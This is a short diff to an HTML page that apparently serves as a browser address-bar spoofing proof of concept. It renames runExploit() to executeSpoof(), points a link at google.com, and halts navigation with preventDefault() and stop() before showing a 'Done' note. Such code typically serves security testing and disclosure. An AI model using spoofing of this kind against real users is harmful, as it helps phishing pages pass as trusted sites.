@@ -5,10 +5,8 @@
 </head>
 <body>
 
-  <h3 id="link_container">
-    <a href="javascript:void(0)" id="a" onclick="runExploit()">
-      <h1>Click Here</h1>
-    </a>
+  <h3>
+    <a href="http://www.google.com" id="a" onclick="executeSpoof(event)">click here Address Bar</a>
   </h3>
   
   <h3 id="note" style="display:none;">
@@ -20,11 +18,14 @@
 </body>
 
 <script>
-  function runExploit() {
+  function executeSpoof(event) {
     
-    try { stop(); } catch(e) {}
+    event.preventDefault();
 
-  
+   
+    try { stop(); } catch(e) {} 
+    
+   
     document.title = 'Done';
     document.getElementById('a').style.display = 'none';
     document.getElementById('note').style.display = 'block';
